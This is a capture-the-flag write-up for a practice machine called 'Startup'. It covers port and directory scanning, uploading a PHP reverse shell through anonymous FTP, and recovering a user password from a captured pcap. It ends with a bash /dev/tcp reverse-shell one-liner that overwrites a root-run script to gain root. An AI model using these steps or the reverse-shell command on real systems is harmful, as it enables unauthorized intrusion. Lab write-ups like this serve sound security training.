# Startup WriteUp
WriteUp for Startup challenge

## Reconnaissance
If we run **nmap**, we'll see that there are 3 ports open:
```sh
- 21 with FTP protocol (Anonymous login allowed)
- 22 with TCP protocol
- 80 with HTTP protocol
```
let's also run gobuster so we know if there's hidden directories that may contain more informations, therefore we'll find:
```sh
/.php                 (Status: 403) [Size: 276]
/.html                (Status: 403) [Size: 276]
/index.html           (Status: 200) [Size: 808]
/files                (Status: 301) [Size: 310] [--> http://10.10.32.68
```
if we go to **files** directory, we'll find that it's the place to store files they use in their website.
```sh
ftp/
important.jpg
notice.txt
```

## Gaining Access
it's interesting that we could see the ftp folder, where we might put reverse shell via ftp and gaining access to it's web server.
So let's go further using ftp connection, and when we're inside, we'll see directory and files we've seen before when we access **files** directory using http protocol. Now, let's use 1001 user reverse shell code from monkey-pentest, dont' forget to change the IP to your tun0 IP, and your prefereable port. Let's went to ftp dir, and copy reverse shell code from local dir to ftp dir using **put**.
```sh
lcd [path  where u put your reverse shell]
cd ftp
put reverseshell.php
```
after we copy our file to ftp, now let's create a listener using netcat
```sh
nc -lnvp 1234
```
Therefore we've gain access to it's webserver

## Further Information gathering
when we go to home directory, we'll see there's **recipe.txt** which is the first ingredients from the first question
inside. when we go to home, where we might find user.txt, we'll find **lennie** directory, but we unable to gain access to it due to permission denied, so let's find more information. Another clue is let's back to / dir, and inside the **incidents** dir, we'll see a **suspicious.pcapng** file. let's copy it to our local directory:
```sh
#in remote machine
python -m SimpleHTTPServer
#in local
wget http://[machine ip]/suspicious.pcapng
```
follow tcp stream and we'll see that user lennie has password c4ntg3t3n0ughsp1c3.
Let's connect it via ssh.

inside, we'll get the second answer **user.txt**.

## Privillage Escalation
in lennie home dir, scripts dir had two files:
- planner.sh
- startup.list
planner.sh script is:
```sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```
while print.sh is:
```sh
#!/bin/bash
echo "Done!"
```
we can overwrite print.sh using reverse shell:
```sh
bash -i >& /dev/tcp/10.18.108.222/3333 0>&1
```
and just execute **sudo -l**, and we gain privillage escalation as root, then get the third answer **root.txt**
